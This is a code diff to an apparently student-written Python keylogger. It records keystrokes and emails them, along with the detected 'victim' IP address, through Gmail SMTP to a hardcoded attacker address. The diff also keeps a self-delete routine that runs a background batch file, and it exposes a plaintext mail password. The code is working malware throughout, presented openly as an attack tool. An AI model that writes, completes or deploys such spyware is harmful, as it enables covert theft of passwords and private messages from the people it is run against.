@@ -6,9 +6,10 @@ import subprocess
 from sys import argv
 import threading
 import Queue
+import socket
 
 destEmail = 'keylogsenderUIUC460@gmail.com'
-dataBufferSize = 500
+dataBufferSize = 100
 hackeremail = "keylogsenderUIUC460"
 hackerpwd =  "qazwsxedcrfv"
 local = False
@@ -16,9 +17,10 @@ exit_key = keyboard.Key.esc
 end_program= False
 data = ""
 q = Queue.Queue()
-holdDowns = ['Key.ctrl_l', 'Key.ctrl_r', 
-			 'Key.shift', 'Key.shift_r',
-			 'Key.alt_l', 'Key.alt_r']
+holdDowns = ['Key.ctrl_l', 'Key.ctrl_r',
+             'Key.shift', 'Key.shift_r',
+             'Key.alt_l', 'Key.alt_r']
+
 def filterKeys(letter):
 	replacements = {
 		'Key.space': ' ',
@@ -60,6 +62,7 @@ def filterKeys(letter):
                 
 	}
 	return replacements.get(letter,letter)
+
 def serverSetup():
 	global hackeremail, hackerpwd
 	server = smtplib.SMTP('smtp.gmail.com', 587)
@@ -67,14 +70,20 @@ def serverSetup():
 	server.login(hackeremail, hackerpwd)
 	return server
 
-def send_data(msg):
-	try:	
+def send_data(msg, victimInfo):
+	try:
+                victimIP = victimInfo.get('IP')
+
+                #build message
+                fullmsg = '\n Source IP:' + str(victimIP) + '\n\n\n\n' + str(msg)
+		print('Message: \n\n' + fullmsg)
+		
 		if(local):
 			print('sending data through LOG FILE')
-			f.write('{0}'.format(msg))	
+			f.write('{0}'.format(fullmsg))	
 		else:
 			print('sending data through EMAIL')
-			server.sendmail("keylogsenderUIUC460@gmail.com", destEmail, msg)
+			server.sendmail("keylogsenderUIUC460@gmail.com", destEmail, fullmsg)
 		print("sending complete")
 	except Exception as e:
 		print('Exception: ' + str(e))
@@ -124,23 +133,35 @@ def run_keylogger():
 			print('Exception: '+str(e))
 
 def run_sender():
+        victimInfo = {}
+        
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        victimIP = s.getsockname()[0]
+        print("Victim IP: " + str(victimIP))
+        s.close()
+
+        victimInfo['IP'] = victimIP
+        
 	if(local):
 		f = open('keylog.txt', 'w')
 		print("logging to file...")
 	else:
 		print("logging to email...")
-		global server 
-	server = serverSetup()
+                global server 
+                server = serverSetup()
 	
 	while(end_program==False):
 		try:
-			msg = q.get(block = True, timeout = 5)				
+			msg = q.get(block = True, timeout = 5)
+			send_data(msg, victimInfo)
 		except:#queue empty 
 			continue
-		send_data(msg)
 
-        if(len(msg) > 0):
-                send_data(msg) #send any unsent messages before closing
+	#send any remaining data
+        global data
+        send_data(data, victimInfo)
+
 	if(local):
 		f.close()
 	else:
@@ -159,6 +180,7 @@ def selfDelete():
 	
 	#run selfdelete file on exe, shell=True makes it run in background
 	subprocess.Popen(path.dirname(path.abspath(__file__))+"\\del.bat", shell=True) 
+
 def main():
 	thread_keylogger = threading.Thread(target = run_keylogger)
 	thread_sender = threading.Thread(target = run_sender)
